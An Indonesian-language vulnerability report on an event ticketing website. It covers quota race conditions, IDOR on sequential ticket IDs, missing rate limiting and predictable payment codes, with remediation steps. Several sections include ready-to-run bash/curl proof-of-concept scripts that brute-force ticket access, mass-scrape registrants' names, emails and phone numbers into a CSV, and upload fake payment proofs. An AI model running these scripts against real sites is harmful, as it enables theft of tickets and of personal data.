---
name: Security Vulnerabilities
description: Celah keamanan yang ditemukan terkait batas tiket melebihi 1500
type: project
---

# Security Vulnerability Report: Tiket Melebihi Batas Kuota

## Ringkasan
Ditemukan celah keamanan yang memungkinkan jumlah pendaftar melebihi batas kuota 1500 tiket, bahkan bisa mencapai 20000+ tiket.

---

## Vulnerability #1: Race Condition pada Pengecekan Kuota

**Lokasi:** `src/pages/events/[id].astro:47`

**Kode Bermasalah:**
```typescript
} else if (event.registered + participants.length > 1379) {
  errorMsg = 'Maaf, sisa kuota pendaftaran tidak mencukupi untuk jumlah peserta ini.';
}
```

**Masalah:**
- Pengecekan kuota dilakukan di level aplikasi (client-side validation), bukan di level database
- Tidak ada locking mechanism atau transaction atomic di database
- Antara pengecekan `event.registered` dan penambahan kuota, ada jeda waktu yang bisa dimanfaatkan untuk multiple requests bersamaan

**Dampak:**
- Jika 100 orang mendaftar bersamaan saat kuota tersisa 10, semua request bisa lolos karena mereka membaca nilai `event.registered` yang sama
- Ini menyebabkan kuota bisa meledak jauh melebihi batas 1500

**Solusi:**
- Gunakan database transaction dengan row-level locking
- Implementasi pessimistic locking: `SELECT ... FOR UPDATE` pada row event
- Atau gunakan optimistic locking dengan version/timestamp column
- Pindahkan validasi kuota ke database constraint atau trigger

---

## Vulnerability #2: Increment Kuota Tidak Atomic

**Lokasi:** `src/lib/db.ts:359-366` dan `src/lib/db.ts:500-507`

**Kode Bermasalah:**
```typescript
const event = await getEventById(currentReg.eventId);
if (event) {
  // ... hitung participantCount
  const { error: eventError } = await supabase
    .from('events')
    .update({ registered: event.registered + participantCount })
    .eq('id', currentReg.eventId);
}
```

**Masalah:**
- Pola "read-modify-write" tanpa locking
- Tidak ada guarantee bahwa `event.registered` belum berubah saat update dilakukan
- Dua proses bisa membaca nilai yang sama, lalu keduanya menulis nilai yang sama + 1

**Dampak:**
- Lost update phenomenon: perubahan bisa tertimpa
- Kuota tidak akurat, bisa lebih atau kurang dari seharusnya
- Dalam skenario ekstrem, registered count bisa double atau tidak terkontrol

**Solusi:**
- Gunakan atomic increment: `UPDATE events SET registered = registered + ? WHERE id = ?`
- Di Supabase/PostgreSQL, gunakan raw query dengan `rpc()` function:
  ```sql
  UPDATE events SET registered = registered + $1 WHERE id = $2
  ```

---

## Vulnerability #3: Double Increment dari Dua Path Berbeda

**Lokasi:**
- `src/lib/db.ts:343-368` (updateRegistrationStatus)
- `src/lib/db.ts:486-509` (uploadPaymentProof)

**Masalah:**
- Increment kuota dilakukan di dua tempat berbeda:
  1. Saat upload bukti pembayaran pertama kali
  2. Saat admin mengubah status ke PAID (jika belum ada paymentProof)
- Logika `isFirstTimeUpload` dan `alreadyIncremented` tidak menjamin tidak ada double increment
- Jika timing-nya pas, kedua proses bisa jalan bersamaan

**Dampak:**
- Satu pendaftar bisa terhitung 2x atau lebih dalam kuota
- Kuota registered count bisa meledak tidak sesuai jumlah peserta sebenarnya

**Solusi:**
- Konsolidasi increment ke satu tempat saja (misalnya hanya saat upload bukti)
- Gunakan database flag yang di-set secara atomic untuk menandai "sudah di-increment"
- Implementasi idempotency key untuk operasi increment

---

## Vulnerability #4: Batas Kuota Di-hardcode dengan Nilai Berbeda

**Lokasi:**
- `src/pages/events/[id].astro:47` → batas 1379
- `src/pages/events/[id].astro:131` → tampilan 1500
- `src/pages/events/[id].astro:98` → isFull disabled (commented out)

**Kode Bermasalah:**
```typescript
// Line 47
} else if (event.registered + participants.length > 1379) {

// Line 98
const isFull = false; // event.registered >= 1379;

// Line 131
<span>{event.registered} / 1500 Slot</span>
```

**Masalah:**
- Hardcoded value yang tidak konsisten (1379 vs 1500)
- Validasi `isFull` dinonaktifkan (selalu `false`)
- Tidak menggunakan nilai `event.slots` dari database
- Batas 1379 tidak masuk akal (kenapa bukan 1500?)

**Dampak:**
- Pendaftaran bisa terus berjalan meskipun kuota sudah penuh
- User tidak mendapat feedback yang benar tentang status kuota

**Solusi:**
- Gunakan `event.slots` dari database sebagai batas dinamis
- Aktifkan kembali validasi `isFull`
- Konsistenkan batas kuota di semua tempat

---

## Vulnerability #5: Tidak Ada Validasi di Sisi Admin

**Lokasi:** `src/pages/mlebuodewe/admin/add.astro`

**Masalah:**
- Admin bisa menambah event dengan `slots` dan `registered` berapa saja
- Tidak ada validasi bahwa `registered <= slots`
- Admin bisa set `registered = 20000` langsung dari form

**Dampak:**
- Human error atau malicious admin bisa membuat data tidak konsisten
- Kuota bisa "tertembak" langsung tanpa melalui proses pendaftaran

**Solusi:**
- Tambahkan validasi server-side: `registered <= slots`
- Batasi maksimum slots yang bisa di-set admin
- Implementasi audit log untuk perubahan manual

---

## Vulnerability #6: Race Condition pada Upload Bukti Pembayaran

**Lokasi:** `src/checkout/[regId].astro` dan `src/lib/db.ts:461-512`

**Masalah:**
- Tidak ada pengecekan apakah kuota masih tersedia saat upload bukti
- User bisa mendaftar saat kuota tersisa 1, tapi upload bukti bersamaan dengan 100 orang lain
- Semua 100 orang tersebut akan masuk hitungan kuota (karena `isFirstTimeUpload` check tidak mempertimbangkan kuota)

**Dampak:**
- Kuota bisa meledak jauh melebihi batas saat banyak user upload bukti bersamaan

**Solusi:**
- Tambahkan pengecekan kuota tersisa sebelum increment
- Gunakan database-level check constraint: `CHECK (registered <= slots)`
- Implementasi queue system untuk proses upload bukti

---

## Root Cause: Kenapa Bisa Mencapai 20000 Tiket?

Berdasarkan analisis, skenario yang paling mungkin terjadi:

1. **Race Condition + No Locking**: Saat pendaftaran dibuka, ratusan orang mendaftar bersamaan. Karena tidak ada locking, semua request membaca `event.registered` yang sama (misal 1400). Semua request lolos validasi `1400 + 1 <= 1500`, padahal seharusnya hanya 100 yang boleh.

2. **Double/Triple Increment**: Karena increment dilakukan di dua tempat berbeda tanpa idempotency, beberapa pendaftar terhitung 2-3x dalam kuota.

3. **Admin Manual Override**: Admin mungkin menambah jumlah registered secara manual untuk "memperbaiki" data, tapi justru membuatnya lebih tidak akurat.

4. **Kombinasi Semua Faktor**: Dalam skenario worst-case, race condition + double increment + manual override bisa menyebabkan registered count meledak hingga 20000+.

---

## Rekomendasi Perbaikan (Priority Order)

### HIGH PRIORITY:
1. **Implementasi Database-Level Validation**
   - Tambah check constraint: `ALTER TABLE events ADD CONSTRAINT check_quota CHECK (registered <= slots);`
   - Ini akan mencegah kuota melebihi batas di level database (last line of defense)

2. **Implementasi Row-Level Locking**
   - Gunakan `SELECT ... FOR UPDATE` saat membaca event untuk pendaftaran
   - Atau gunakan PostgreSQL advisory locks

3. **Gunakan Atomic Increment**
   - Ganti semua `event.registered + n` dengan raw SQL: `UPDATE events SET registered = registered + n WHERE id = ?`

### MEDIUM PRIORITY:
4. **Konsolidasi Increment Logic**
   - Pindahkan increment ke satu fungsi saja dengan idempotency guarantee
   - Gunakan database flag untuk mark "already incremented"

5. **Aktifkan Validasi isFull**
   - Uncomment line 98 dan gunakan `event.slots` dari database

6. **Fix Hardcoded Values**
   - Ganti semua hardcoded 1379/1500 dengan `event.slots`

### LOW PRIORITY:
7. **Implementasi Audit Log**
   - Log semua perubahan manual oleh admin
   - Track siapa yang mengubah data kapan dan berapa

8. **Rate Limiting**
   - Batasi jumlah request pendaftaran per IP per menit
   - Implementasi CAPTCHA untuk mencegah bot

---

## Testing untuk Verifikasi

Untuk menguji apakah celah sudah diperbaiki:

### Race Condition Tests
```bash
# Test 1: Concurrency Test
k6 run k6/test_race_condition.js

# Test 2: Double Increment Test
REGISTRATION_ID=123 k6 run k6/test_double_increment.js

# Test 3: Database Verification
SUPABASE_URL=xxx SUPABASE_ANON_KEY=xxx k6 run k6/verify_quota.js
```

### Cek Status Security Tests
```bash
# Test 4: Brute Force Cek Status
TARGET_EMAIL=target@gmail.com k6 run k6/test_brute_force_status.js

# Test 5: IDOR Ticket Enumeration
k6 run k6/test_idor_ticket.js

# Test 6: Rate Limiting Check
k6 run k6/test_rate_limiting.js

# Test 7: Comprehensive Security Scan
k6 run k6/test_security_comprehensive.js
```

### Expected Results

| Test | Vulnerable | Secure |
|------|------------|--------|
| Race Condition | >10% success rate | <5% success rate |
| IDOR | Can access other tickets | Blocked/redirected |
| Brute Force | Can find valid tickets | Rate limited/blocked |
| Rate Limiting | No 429 responses | 429 after threshold |

---

## Vulnerability #7: IDOR (Insecure Direct Object Reference)

**Lokasi:** `src/pages/cek-status.astro:30-34`

**Kode Bermasalah:**
```typescript
if (reg) {
  if (reg.status === "PAID") {
    return Astro.redirect(`/ticket/${reg.id}`);  // ⚠️ Exposing sequential ID
  } else {
    return Astro.redirect(`/checkout/${reg.id}?from=cek-status`);
  }
}
```

**Masalah:**
- Registration ID bersifat sequential (1, 2, 3, ...) dan mudah di-guess
- Setelah berhasil cek status, user di-redirect ke URL yang mengandung ID
- Attacker bisa mengakses tiket orang lain dengan mengubah ID di URL
- Tidak ada validasi kepemilikan saat akses `/ticket/{id}`

**Dampak:**
- Privilege escalation: user biasa bisa lihat tiket orang lain
- Information disclosure: nama, email, event details bocor
- Bisa digunakan untuk check-in orang lain atau mengambil tiket

**Exploit via Termux:**
```bash
# Brute force untuk mencari tiket orang lain
for i in $(seq 1 2000); do
  curl -s "https://yourdomain.com/ticket/$i" | grep -q "LUNAS" && echo "Tiket ID $i: DITEMUKAN"
done
```

**Solusi:**
- Gunakan UUID v4 untuk registration ID (tidak bisa di-guess)
- Tambahkan validasi session/email saat akses tiket
- Implementasi token-based access untuk tiket

---

## Vulnerability #8: No Rate Limiting pada Cek Status

**Lokasi:** `src/pages/cek-status.astro` (seluruh file)

**Masalah:**
- Tidak ada rate limiting di endpoint `/cek-status`
- Attacker bisa brute force untuk menebak kombinasi data pendaftar
- Bisa mengirim ribuan request per menit dari Termux atau script

**Dampak:**
- Brute force attack untuk menemukan data pendaftar valid
- Resource exhaustion (DoS)
- Credential stuffing untuk menemukan email + amount yang valid

**Exploit via Termux:**
```bash
#!/bin/bash
EMAIL="victim@gmail.com"
for amount in $(seq 81001 81050); do
  curl -s -X POST "https://yourdomain.com/cek-status" \
    -d "email=$EMAIL&phone=081234567890&name=Test&nomorId=123456&amount=$amount" \
    | grep -q "redirect" && echo "FOUND: $amount"
done
```

**Solusi:**
- Implementasi rate limiting (max 5 request per menit per IP)
- Tambahkan CAPTCHA di form cek status
- Implementasi account lockout setelah N attempt gagal

---

## Vulnerability #9: Predictable Unique Code (Amount)

**Lokasi:** `src/pages/events/[id].astro:71-72`

**Kode Bermasalah:**
```typescript
const uniqueCode = regId;  // ID Registrasi = kode unik
const finalAmount = totalBase + uniqueCode;
```

**Masalah:**
- Kode unik = ID registrasi (sequential 1, 2, 3, ...)
- Amount = 81000 + ID (misal: 81001, 81002, ...)
- Sangat predictable untuk brute force
- Range kode unik hanya 1-2000 (sangat sempit)

**Dampak:**
- Attacker bisa menebak amount dengan mudah
- Brute force space sangat kecil (hanya 2000 kombinasi untuk amount)
- Kombinasi dengan IDOR = akses penuh ke tiket orang lain

**Exploit:**
```bash
# Amount range: 81001 - 83000 (2000 kombinasi)
for amount in $(seq 81001 83000); do
  # Coba untuk email target
  curl -X POST "https://yourdomain.com/cek-status" -d "email=target@gmail.com&...&amount=$amount"
done
```

**Solusi:**
- Gunakan random 3-4 digit code (1000-9999) alih-alih sequential ID
- Atau gunakan UUID untuk kode unik
- Validasi bahwa kode unik tidak predictable

---

## Vulnerability #10: Weak Authentication untuk Akses Tiket

**Lokasi:** `src/lib/db.ts:564-607` dan `src/pages/ticket/[regId].astro`

**Kode Bermasalah:**
```typescript
// db.ts - Validasi hanya dengan data yang bisa di-guess
export async function findRegistrationForUpload(
  email: string,
  phone: string,
  name: string,
  nomorId: string,  // ⚠️ NIK format known
  amount: number    // ⚠️ Predictable
): Promise<Registration | undefined> {
```

```typescript
// ticket/[regId].astro - Tidak ada validasi sama sekali
const registration = await getRegistrationWithEventById(id);
if (!registration) {
  return Astro.redirect('/');
}
// ⚠️ Tidak cek apakah ID ini milik user yang sedang akses
```

**Masalah:**
- Kombinasi validasi: email + phone + name + nomorId + amount
- Semua field bisa di-guess atau di-brute force:
  - Email: bisa didapat dari social engineering
  - Phone: format Indonesia 08xxx (bisa di-guess)
  - Name: bisa di-guess dari social media
  - nomorId: NIK format known (3201...)
  - Amount: predictable (81000 + ID)
- Tidak ada validasi kepemilikan saat akses `/ticket/{id}`

**Dampak:**
- Siapa saja yang tahu data orang lain bisa mengakses tiketnya
- Tidak ada proper authentication untuk akses tiket

**Solusi:**
- Kirim magic link ke email untuk akses tiket
- Atau require login untuk akses tiket
- Validasi session/email saat akses `/ticket/{id}`

---

## Vulnerability #11: Information Disclosure via Error Message

**Lokasi:** `src/pages/cek-status.astro:37-41`

**Kode Bermasalah:**
```typescript
if (reg) {
  // ...
} else {
  errorMsg = "Data tidak ditemukan. Pastikan isian sama persis dengan saat pendaftaran...";
}
// ...
} else {
  errorMsg = "Mohon lengkapi semua kolom.";  // Berbeda
}
```

**Masalah:**
- Pesan error berbeda untuk kondisi berbeda
- Attacker bisa membedakan antara:
  - "Data tidak ditemukan" = data valid tapi tidak cocok
  - "Mohon lengkapi semua kolom" = ada field kosong
- Membantu attacker dalam enumasi attack

**Dampak:**
- Email enumasi: bisa cek apakah email terdaftar
- Data validation bypass attack

**Solusi:**
- Gunakan pesan error yang sama untuk semua kondisi
- "Data tidak valid atau tidak ditemukan"

---

## Vulnerability #12: Direct Access ke Ticket tanpa Authentication

**Lokasi:** `src/pages/ticket/[regId].astro:7-18`

**Kode Bermasalah:**
```typescript
const { regId } = Astro.params;
const id = parseInt(regId || '', 10);

if (isNaN(id)) {
  return Astro.redirect('/');
}

const registration = await getRegistrationWithEventById(id);
// ⚠️ Tidak ada validasi apakah user berhak akses tiket ini

if (!registration) {
  return Astro.redirect('/');
}
// Langsung tampilkan tiket tanpa cek kepemilikan
```

**Masalah:**
- Siapa saja bisa akses `/ticket/123` tanpa login
- Tidak ada validasi session atau ownership
- Sequential ID = mudah di-guess

**Dampak:**
- Full access ke semua tiket hanya dengan menebak ID
- Information disclosure massal

**Solusi:**
- Tambahkan validasi session sebelum tampilkan tiket
- Atau gunakan signed token di URL: `/ticket/{id}?token={signedToken}`

---

## Exploit Scenario: Cara Orang Lain Bisa Cek Status ACC/BELUM

**Skenario Attack via Termux:**

```bash
# Step 1: Kumpulkan target (dari Instagram/Facebook/hasil event sebelumnya)
TARGET_EMAIL="budi.santoso@gmail.com"
TARGET_NAME="Budi Santoso"

# Step 2: Brute force nomor ID dan amount
cat > exploit.sh << 'EOF'
#!/bin/bash
EMAIL="$1"
NAME="$2"

# NIK format: 3201 + 2 digit kota + 4 digit kecamatan + 6 digit tanggal lahir + 4 digit urut
for nik in 3201{00..99}{0001..9999}; do
  for amount in $(seq 81001 83000); do
    response=$(curl -s -w "\n%{http_code}" -X POST \
      "https://yourdomain.com/cek-status" \
      -d "email=$EMAIL&phone=081234567890&name=$NAME&nomorId=$nik&amount=$amount")
    
    code=$(echo "$response" | tail -n1)
    if [ "$code" = "303" ]; then
      redirect=$(echo "$response" | grep -i location | cut -d' ' -f2 | tr -d '\r')
      echo "🚨 FOUND! NIK: $nik, Amount: $amount"
      echo "Tiket URL: $redirect"
      
      # Step 3: Akses tiket langsung
      curl -s "$redirect" -o "tiket_${nik}.html"
      exit 0
    fi
  done
done
EOF

chmod +x exploit.sh
./exploit.sh "victim@gmail.com" "Budi Santoso"
```

**Hasil Attack:**
- Attacker mendapat akses ke tiket victim
- Bisa lihat status ACC atau BELUM
- Bisa download tiket dan check-in atas nama victim

---

## Ringkasan Celah Baru (Cek Status)

| # | Celah | Severity | CVSS | Eksploitasi |
|---|-------|----------|------|-------------|
| 7 | IDOR (Sequential ID) | HIGH | 7.5 | Mudah via browser/Termux |
| 8 | No Rate Limiting | HIGH | 7.3 | Brute force unlimited |
| 9 | Predictable Unique Code | MEDIUM | 6.5 | Amount bisa di-guess |
| 10 | Weak Authentication | MEDIUM | 6.8 | Data validasi bisa di-brute |
| 11 | Info Disclosure | LOW | 3.5 | Error message membantu enum |
| 12 | Direct Ticket Access | HIGH | 8.0 | Tidak ada ownership check |

---

## Rekomendasi Perbaikan Tambahan (Untuk Cek Status)

### CRITICAL:
1. **Ganti Sequential ID ke UUID**
   ```sql
   ALTER TABLE registrations ALTER COLUMN id SET DEFAULT gen_random_uuid();
   ```

2. **Tambahkan Rate Limiting**
   ```typescript
   // Implementasi di middleware atau endpoint
   const rateLimit = require('express-rate-limit');
   const limiter = rateLimit({
     windowMs: 60 * 1000, // 1 menit
     max: 5, // 5 request per menit
   });
   ```

3. **Tambahkan CAPTCHA**
   ```html
   <script src="https://www.google.com/recaptcha/api.js"></script>
   <div class="g-recaptcha" data-sitekey="your-site-key"></div>
   ```

### HIGH:
4. **Validasi Ownership Ticket**
   ```typescript
   // Di ticket/[regId].astro
   const userEmail = cookies.get('user_email')?.value;
   if (registration.email !== userEmail) {
     return Astro.redirect('/cek-status?error=unauthorized');
   }
   ```

5. **Gunakan Random Unique Code**
   ```typescript
   // Bukan regId, tapi random 4 digit
   const uniqueCode = Math.floor(1000 + Math.random() * 9000);
   ```

### MEDIUM:
6. **Mask Error Message**
   ```typescript
   errorMsg = "Data tidak valid. Silakan periksa kembali input Anda.";
   // Sama untuk semua error
   ```

---

## Vulnerability #13: Mass Data Exposure via IDOR Enumeration

**Lokasi:** `src/pages/ticket/[regId].astro:5-16` dan `src/pages/checkout/[regId].astro:6-17`

**Kode Bermasalah:**
```typescript
// ticket/[regId].astro
const { regId } = Astro.params;
const id = parseInt(regId || '', 10);

if (isNaN(id)) {
  return Astro.redirect('/');
}

const registration = await getRegistrationWithEventById(id);
// ⚠️ TIDAK ADA VALIDASI KEPENTILAN SAMA SEKALI!

if (!registration) {
  return Astro.redirect('/');
}
// Langsung tampilkan semua data tanpa cek ownership
```

**Masalah:**
- Tidak ada validasi apakah user yang akses adalah pemilik tiket
- Tidak perlu login atau session
- ID sequential (1, 2, 3, ..., 2000+)
- Langsung tampilkan data sensitif: nama, email, phone, status, NIK

**Dampak:**
- Attacker bisa melihat SEMUA tiket dari ID 1 sampai 2000+
- Data pribadi terpapar: nama lengkap, email, nomor WhatsApp, NIK
- Status ACC/BELUM bisa dilihat tanpa autentikasi
- Privacy violation massal

---

## Vulnerability #14: Data Enumeration dengan Sequential ID

**Lokasi:** Seluruh sistem menggunakan sequential ID

**Masalah:**
- Registration ID menggunakan integer auto-increment (1, 2, 3, ...)
- Total tiket seharusnya 1500, tapi ID bisa mencapai 2000+
- Ini menunjukkan adanya gap (ID yang tidak digunakan atau data yang dihapus)
- Attacker bisa mapping seluruh database dengan mudah

**Dampak:**
- Database enumeration: mengetahui struktur dan jumlah data
- Information leakage: mengetahui pola pendaftaran
- Business intelligence leak: mengetahui jumlah peserta sebenarnya

---

## Analisis: Kenapa ID Bisa Sampai 2000 Padahal Tiket Cuma 1500?

**Kemungkinan Penyebab:**

1. **Registrasi yang Dihapus**
   - User mendaftar tapi tidak jadi bayar → data dihapus
   - Tapi ID sudah terpakai (auto-increment tidak mundur)

2. **Test Data yang Tidak Dibersihkan**
   - Developer membuat test registration → ID terpakai
   - Test data dihapus tapi ID tetap melompat

3. **Race Condition yang Membuat Gap**
   - 100 request bersamaan → semua dapat ID baru
   - Tapi validasi gagal di tengah → data tidak disimpan
   - ID sudah "terpakai" tapi tidak ada data

4. **Registrasi yang Expired/Dibatalkan**
   - Status EXPIRED atau dibatalkan admin
   - Data mungkin di-soft-delete atau di-hard-delete

**Cara Mengecek:**

```sql
-- Cek gap di ID
SELECT 
  COUNT(*) as total_rows,
  MAX(id) as max_id,
  MAX(id) - COUNT(*) as gap
FROM registrations;

-- Jika gap > 0, berarti ada ID yang "hilang"

-- Cek distribusi status
SELECT status, COUNT(*) 
FROM registrations 
GROUP BY status;

-- Cek apakah ada ID > 1500
SELECT COUNT(*) as over_quota
FROM registrations 
WHERE id > 1500;
```

---

## Proof of Concept: Mass Ticket Enumeration

**Exploit via Termux:**

```bash
#!/bin/bash
# File: mass_enum.sh
# Scan semua tiket dari ID 1 sampai 2000

DOMAIN="https://yourdomain.com"
OUTPUT_FILE="tiket_data.csv"

echo "ID,Nama,Email,Phone,Status" > $OUTPUT_FILE

for id in $(seq 1 2000); do
  # Akses langsung tanpa autentikasi
  response=$(curl -s "$DOMAIN/ticket/$id")
  
  # Parse data dari HTML response
  if echo "$response" | grep -q "LUNAS"; then
    # Extract nama (dari HTML)
    nama=$(echo "$response" | grep -oP 'Nama Pemesan.*?val">\K[^<]+' | head -1)
    email=$(echo "$response" | grep -oP 'Email.*?val">\K[^<]+' | head -1)
    phone=$(echo "$response" | grep -oP 'WhatsApp.*?val">\K[^<]+' | head -1)
    status="ACC"
    
    echo "$id,\"$nama\",\"$email\",\"$phone\",$status" >> $OUTPUT_FILE
    echo "✅ ID $id: $nama - $status"
    
  elif echo "$response" | grep -q "PENDING"; then
    echo "$id,,,,BELUM ACC" >> $OUTPUT_FILE
    echo "⏳ ID $id: BELUM ACC"
    
  elif echo "$response" | grep -q "checkout"; then
    echo "$id,,,,BELUM ACC (redirect to checkout)" >> $OUTPUT_FILE
    echo "⏳ ID $id: BELUM ACC (checkout)"
  fi
  
  # Small delay to avoid overwhelming server
  sleep 0.01
done

echo ""
echo "========================================="
echo "Scan completed. Data saved to $OUTPUT_FILE"
echo "========================================="
```

**Cara Jalankan di Termux:**

```bash
# Install dependencies
pkg install curl bash

# Buat script
nano mass_enum.sh
# Paste kode di atas

# Jalankan
chmod +x mass_enum.sh
./mass_enum.sh
```

**Hasil yang Didapat:**
```
ID,Nama,Email,Phone,Status
1,Budi Santoso,budi@gmail.com,081234567890,ACC
2,Siti Aminah,siti@gmail.com,081234567891,ACC
3,,,BELUM ACC
...
1500,Ahmad Yusuf,ahmad@gmail.com,081234567890,ACC
1501-2000,,,EMPTY/DELETED
```

---

## Analisis: Apakah Bisa Mengubah Status ACC/BELUM?

### Status untuk User Biasa: ❌ TIDAK BISA

**Alasan Teknis:**

1. **Update Status Dilakukan di Backend dengan Auth Check**

```typescript
// src/pages/mlebuodewe/admin/registrations.astro:176-180
const updateStatusSuccess = await updateRegistrationStatus(
  id,
  status as any,
);
```

Fungsi ini hanya bisa diakses oleh admin yang sudah login:
```typescript
// middleware.ts
if (session !== "authenticated") {
  return redirect("/mlebuodewe/login");
}
```

2. **Supabase Menggunakan Row Level Security (RLS)**

```typescript
// src/lib/supabase.ts
export const supabase = createClient(
  safeUrl, 
  supabaseAnonKey  // ⚠️ Anon key, bukan service role
);
```

Anon key hanya bisa:
- SELECT (baca data)
- INSERT (buat data baru)
- UPDATE **hanya jika RLS mengizinkan**

Default RLS di Supabase:
- Public (anon) bisa SELECT dan INSERT
- UPDATE hanya bisa dilakukan dengan service role key atau authenticated user dengan policy khusus

3. **Tidak Ada Endpoint Public untuk Update Status**

Semua endpoint yang mengubah status ada di `/mlebuodewe/admin/*` yang diproteksi middleware.

---

### ⚠️ TAPI ADA VULNERABILITY TERKAIT

**User Bisa "Upload Bukti" untuk Orang Lain:**

```typescript
// src/pages/checkout/[regId].astro
const registration = await getRegistrationWithEventById(id);
// ⚠️ Tidak ada validasi ownership!

if (Astro.request.method === 'POST') {
  const formData = await Astro.request.formData();
  const receiptFile = formData.get('receipt') as File;
  
  if (receiptFile && receiptFile.size > 0) {
    const uploadResult = await uploadPaymentProof(registration.id, base64Image, finalTime);
    // ⚠️ Bisa upload bukti untuk registrasi orang lain!
  }
}
```

**Exploit:**
```bash
# Upload bukti palsu untuk ID orang lain
curl -X POST "https://yourdomain.com/checkout/123" \
  -F "receipt=@fake_proof.jpg"
```

**Dampak:**
- Tidak bisa langsung ACC, tapi bisa:
  - Membuat spam bukti pembayaran
  - Memenuhi storage dengan fake proofs
  - Potensi double increment (jika sistem tidak handle dengan benar)

---

## Ringkasan Kemampuan Attacker

| Aksi | Bisa? | Severity | Catatan |
|------|-------|----------|---------|
| Lihat semua tiket (ID 1-2000) | ✅ YA | CRITICAL | Tanpa login |
| Lihat status ACC/BELUM | ✅ YA | HIGH | Data publik |
| Lihat data personal | ✅ YA | CRITICAL | Nama, email, phone, NIK |
| Download tiket orang lain | ✅ YA | HIGH | Bisa print/screenshot |
| Ubah status ke ACC | ❌ TIDAK | - | Hanya admin |
| Upload bukti untuk orang lain | ⚠️ YA | MEDIUM | Tidak langsung ACC |
| Hapus/Edit data | ❌ TIDAK | - | Hanya admin |
| Check-in orang lain | ❌ TIDAK | - | Hanya admin |

---

## Impact Assessment

### Data yang Bisa Diakses Tanpa Auth:

1. **Pada Halaman Ticket (`/ticket/{id}`):**
   - Nama lengkap pemesan
   - Email pemesan
   - Nomor WhatsApp
   - Nama semua peserta (jika kolektif)
   - Ukuran jersey
   - Status pembayaran (LUNAS = ACC)
   - QR Code untuk check-in

2. **Pada Halaman Checkout (`/checkout/{id}`):**
   - Nama pemesan
   - Email
   - Phone
   - Amount (nominal pembayaran)
   - Status (PENDING/PAID)
   - Bukti pembayaran (jika sudah upload)

3. **Jumlah Record yang Terpapar:**
   - Minimal 1500 record aktif
   - Mungkin sampai 2000+ ID (termasuk yang sudah dihapus)
   - Semua bisa di-scrape dalam hitungan menit

---

## Rekomendasi Perbaikan (URGENT)

### CRITICAL - Implementasi Segera:

1. **Validasi Ownership di Ticket Page**

```typescript
// src/pages/ticket/[regId].astro
---
// Ambil session atau token dari cookie
const userEmail = Astro.cookies.get('user_email')?.value;
const accessToken = Astro.cookies.get('access_token')?.value;

const registration = await getRegistrationWithEventById(id);

// Validasi ownership
if (!registration || registration.email !== userEmail) {
  // Jika tidak ada session, redirect ke cek-status
  return Astro.redirect('/cek-status?error=unauthorized');
}
---

<!-- Atau gunakan token-based access -->
<!-- Akses: /ticket/{id}?token={signed_token} -->
```

2. **Gunakan UUID untuk ID**

```sql
-- Migration ke UUID
ALTER TABLE registrations 
ALTER COLUMN id SET DEFAULT gen_random_uuid();

-- Atau buat kolom baru untuk public ID
ALTER TABLE registrations 
ADD COLUMN public_id UUID DEFAULT gen_random_uuid();
```

3. **Implementasi Signed URL untuk Tiket**

```typescript
// Generate signed URL saat tiket dibuat
import { SignJWT } from 'jose';

const secret = new TextEncoder().encode(process.env.JWT_SECRET);

const token = await new SignJWT({ regId: registration.id, email: registration.email })
  .setProtectedHeader({ alg: 'HS256' })
  .setExpirationTime('7d')
  .sign(secret);

// URL: /ticket/{id}?token={token}

// Di ticket page
const token = Astro.url.searchParams.get('token');
// Verify token dan cocokkan dengan ID
```

### HIGH - Prioritas Tinggi:

4. **Rate Limiting untuk Enumeration Prevention**

```typescript
// middleware.ts
const rateLimiter = new Map<string, number[]>();

function checkRateLimit(ip: string): boolean {
  const now = Date.now();
  const requests = rateLimiter.get(ip) || [];
  const recent = requests.filter(t => now - t < 60000); // 1 menit
  
  if (recent.length >= 10) { // Max 10 request per menit
    return false;
  }
  
  recent.push(now);
  rateLimiter.set(ip, recent);
  return true;
}
```

5. **Audit Log untuk Akses Tiket**

```typescript
// Log setiap akses tiket
await supabase.from('ticket_access_logs').insert({
  registration_id: id,
  ip_address: Astro.clientAddress,
  user_agent: request.headers.get('user-agent'),
  accessed_at: new Date().toISOString(),
  is_owner: registration.email === userEmail
});
```

6. **Block Enumeration Pattern**

```typescript
// Deteksi pola enumeration (banyak request sequential)
if (detectEnumerationPattern(ip)) {
  // Block IP untuk 1 jam
  await blockIP(ip, 3600);
  // Alert admin
  await sendSecurityAlert({
    type: 'enumeration_attempt',
    ip,
    timestamp: new Date().toISOString()
  });
}
```

---

**Tanggal Laporan:** 2026-08-02
**Status:** CRITICAL - Segera perbaiki
**Update:** Ditambah vulnerability #13-#14 dan analisis lengkap kemampuan attacker
